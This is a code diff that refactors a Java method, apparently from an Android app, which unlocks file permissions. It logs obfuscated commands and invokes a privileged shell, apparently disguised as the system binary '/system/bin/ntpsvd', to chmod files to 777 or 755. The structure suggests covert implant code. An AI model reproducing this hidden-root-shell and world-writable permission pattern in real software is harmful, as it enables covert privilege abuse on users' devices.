@@ -255,38 +255,36 @@ public class Path {
 	}
 
 	public static boolean unprotect(String path, boolean fullmode) {
-		synchronized (Status.self().lockFramebuffer) {
 
-			File file = new File(path);
+		File file = new File(path);
 
-			if (fullmode) {
-				if (file.canRead() && file.canWrite()) {
-					return true;
-				}
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e("  qzx chmod 777 ") + " " + path);
-				}
-				Execute.chmod(M.e("777"), path);
-				Utils.sleep(200);
-			} else {
-				if (file.canRead()) {
-					return true;
-				}
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e(" qzx chmod 755 ") + " " + path);
-				}
-				// h_3=/system/bin/ntpsvd qzx chmod 755
-				Execute.chmod(M.e("755"), path);
-				Utils.sleep(200);
+		if (fullmode) {
+			if (file.canRead() && file.canWrite()) {
+				return true;
 			}
-
-			file = new File(path);
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (unprotect) return: " + path + " " + file.canRead());
+				Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e("  qzx chmod 777 ") + " " + path);
 			}
-			return file.canRead();
-
+			Execute.chmod(M.e("777"), path);
+			Utils.sleep(200);
+		} else {
+			if (file.canRead()) {
+				return true;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e(" qzx chmod 755 ") + " " + path);
+			}
+			// h_3=/system/bin/ntpsvd qzx chmod 755
+			Execute.chmod(M.e("755"), path);
+			Utils.sleep(200);
 		}
+
+		file = new File(path);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (unprotect) return: " + path + " " + file.canRead());
+		}
+		return file.canRead();
+
 	}
 
 	public static boolean unprotect(String dbDir, String fileName, boolean fullMode) {
